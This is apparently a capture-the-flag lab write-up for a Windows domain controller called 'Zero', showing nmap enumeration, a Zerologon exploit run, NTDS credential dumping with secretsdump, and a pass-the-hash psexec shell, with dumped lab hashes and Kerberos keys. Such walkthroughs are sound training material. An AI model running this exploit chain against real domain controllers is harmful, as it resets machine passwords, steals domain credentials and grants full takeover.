# Zero

## Enumeration

### nmap:

```
PORT     STATE SERVICE       REASON  VERSION
53/tcp   open  domain        syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-11-18 19:29:38Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack
445/tcp  open  microsoft-ds? syn-ack
464/tcp  open  kpasswd5?     syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack
3268/tcp open  ldap          syn-ack
3269/tcp open  tcpwrapped    syn-ack
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: ZERO
|   NetBIOS_Domain_Name: ZERO
|   NetBIOS_Computer_Name: ZERO-DC
|   DNS_Domain_Name: Zero.csl
|   DNS_Computer_Name: Zero-DC.Zero.csl
|   Product_Version: 10.0.17763
|_  System_Time: 2021-11-18T19:29:52+00:00
|_ssl-date: 2021-11-18T19:30:05+00:00; +2m27s from scanner time.
| ssl-cert: Subject: commonName=Zero-DC.Zero.csl
| Issuer: commonName=Zero-DC.Zero.csl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-17T19:25:24
| Not valid after:  2022-05-19T19:25:24
| MD5:   613b 4001 e659 bcda d6a3 79ba f8ff 039d
| SHA-1: ab61 aa0d 893d 76d4 43cc 928b 673d 1b1d ed34 418a
| -----BEGIN CERTIFICATE-----
| MIIC5DCCAcygAwIBAgIQOPf6gIYwOZBBjnETH1nRFDANBgkqhkiG9w0BAQsFADAb
| MRkwFwYDVQQDExBaZXJvLURDLlplcm8uY3NsMB4XDTIxMTExNzE5MjUyNFoXDTIy
| MDUxOTE5MjUyNFowGzEZMBcGA1UEAxMQWmVyby1EQy5aZXJvLmNzbDCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAKs31tcUhVvzBJGmwzvPGEcqO1+Fa/0V
| cAl8DtB9Dj9DUqxet9wCWnxozCLhBe8fegQ8nnS+9kwnY/60KQcPEtD4RY2YaAnE
| P2VaipO/M1PCXfljYyWEsp9TUBhBA8w/32HNheV4u5Y1A+MBPx5NQ5VHRXlG7Qyb
| EOG5ag94IvyX+QcotTAAG78YeSQAZDSJ2UQS4s/IRofeaoHYv5Msnhj/e/U/gkCX
| tYX5m5/kW6eU4lyrcEtYsDFovodRBwvipVFe+8Riwx8dTxV6c1XdlTCeg1tWp3A6
| EVQEScpnw7PdxJX5WXdXhI4fKp3lpjNXphXz1KSw5YsTjAdD9r20C6UCAwEAAaMk
| MCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEB
| CwUAA4IBAQCWc9+ryeyCuk3TnwEzB2URXksDYs8/5CC8SXZBOalXA+PSlptHPSEO
| 61JNvBAPcUQ7aMTf/IGtSqUwDD5EU3NY8TmodF/FeUOEl1EpEK/FaDBCn1A/32co
| /dVAS37JIJ5JdSRZCd+3qUfrXmKdaO/LFxI3eOnr+judGMB7FpaRDwN5LBkcftdG
| KjAG72iQFvEIaVzduXLA3C2nDRPl8ZkqSG/10tdOOfAXfprtoJ+uVoOks54Xl84E
| UYuIvmzhP/kW7+7TRp/xyBf4CQkOb9qBNSonsk0t+dS/U/nz/hmo/WbV7tqL+upL
| pEj7zOtMknsu4cn37yhEZ1ATC0G0s5A1
|_-----END CERTIFICATE-----
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: ZERO-DC, NetBIOS user: <unknown>, NetBIOS MAC: 0a:16:42:56:3e:a4 (unknown)
| Names:
|   ZERO-DC<20>          Flags: <unique><active>
|   ZERO-DC<00>          Flags: <unique><active>
|   ZERO<00>             Flags: <group><active>
|   ZERO<1c>             Flags: <group><active>
| Statistics:
|   0a 16 42 56 3e a4 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-time:
|   date: 2021-11-18T19:29:52
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 32542/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 29963/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 41168/udp): CLEAN (Timeout)
|   Check 4 (port 54243/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 2m26s, deviation: 0s, median: 2m26s
```

No website (even though there is a web server). It's a windows machine with RPC open on port 135.
Enumeration with rpcdump.py gives no endpoint, but the nmap script says DC so we are facing a domain controller.

A simple google search for 'domain controller vulnerabilities' tell us about [Zerologon](https://nvd.nist.gov/vuln/detail/CVE-2020-1472)

A critical vulnerability with a cvss of 10. It's potentially destructive though, as it changes the DC password to blank.

A good Poc can be found [here](https://github.com/dirkjanm/CVE-2020-1472).

```
└──╼ $python cve-2020-1472-exploit.py ZERO-DC 172.31.1.29
Performing authentication attempts...
====================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

now we use secretsdump to harvest hashes with -no-password

```
└──╼ $secretsdump.py -no-pass -just-dc zero/'Zero-DC$'@172.31.1.29
Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a190af9837b4381407a3b689e0c839cf:::
jared:1104:aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990:::
ZERO-DC$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:1bf898538a3b6eeb9b89cf68995e5463053a979f1a898138d39315685c978e96
Administrator:aes128-cts-hmac-sha1-96:a938e7b92eb1348102d819e12ce42637
Administrator:des-cbc-md5:b9f8f4aba129fd37
krbtgt:aes256-cts-hmac-sha1-96:5668dbe3fa1b0d62052045f6d87e37189746f11d05df8c59c1b107ca524883f1
krbtgt:aes128-cts-hmac-sha1-96:fea193d0c59da8e5bbaee22020394fdc
krbtgt:des-cbc-md5:92611373c257c71f
jared:aes256-cts-hmac-sha1-96:1ba68250e533e74ad85cc920f1c827cb9766a6d335a79f7764ce4439cce7f252
jared:aes128-cts-hmac-sha1-96:8946e418c70e2c8669f795a094c99f9e
jared:des-cbc-md5:f8438fc1a4e3162a
ZERO-DC$:aes256-cts-hmac-sha1-96:458cb41c4271c035ae1a9188a4262f00e9dbf94cafc9f5725061d27685eabca4
ZERO-DC$:aes128-cts-hmac-sha1-96:ab9cc7c32dfef381832477eb1ce0cb29
ZERO-DC$:des-cbc-md5:e6efc7387cbcb070

[*] Cleaning up...
```

Now we psexec.py we can get access using the hashes

```
└──╼ $psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990 Administrator@172.31.1.29
Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.31.1.29.....
[*] Found writable share ADMIN$
[*] Uploading file VtozMCXk.exe
[*] Opening SVCManager on 172.31.1.29.....
[*] Creating service lcjz on 172.31.1.29.....
[*] Starting service lcjz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Flags can now be harvested:

User flag is in C:\Users\jared\Desktop folder  
`type Access.txt`

System flag is in Administrator's Desktop folder  
`type System.txt`

And it's done!
